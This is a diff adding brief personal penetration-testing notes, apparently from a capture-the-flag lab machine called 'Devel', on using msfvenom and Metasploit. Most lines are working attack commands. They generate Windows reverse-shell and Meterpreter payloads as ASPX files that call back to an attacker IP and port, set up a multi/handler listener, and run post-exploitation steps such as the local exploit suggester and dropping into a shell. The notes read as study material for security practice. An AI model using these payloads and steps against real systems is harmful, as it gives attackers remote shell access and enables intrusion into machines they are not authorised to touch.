@@ -1,0 +1,36 @@
+List different types of payload: msfvenom -l payload
+Frequently used are reverse tcp
+
+msfvenom -p <payload> LHOST=<my_ip> LPORT=<my_listening_port> -f <format> -o <output_file>
+
+Devel: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=2357 -f aspx -o devel.aspx
+But recommend to use metasploit meterpreter
+
+Devel: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f aspx -o devel.aspx
+in Metasploit:
+  _ use exploit/multi/handler
+  _ set payload windows/meterpreter/reverse_tcp
+  If u dont know what to do --> show options
+  _ After show options: run
+
+  When inside meterpreter:
+  _ sysinfo
+  _ Hop into shell: shell
+  _ help
+  _ Background the meterpreter: bg
+
+  Search for exploit:
+    _ search suggest
+    _ use post/multi/recon/local_exploit_suggester
+    _ show options
+    _ set things ...
+    _ run
+
+  To go back to background meterpreter: sessions -i <session_id>
+
+
+Inside machine:
+  Windows:
+    systeminfo
+    dir,
+    type = cat
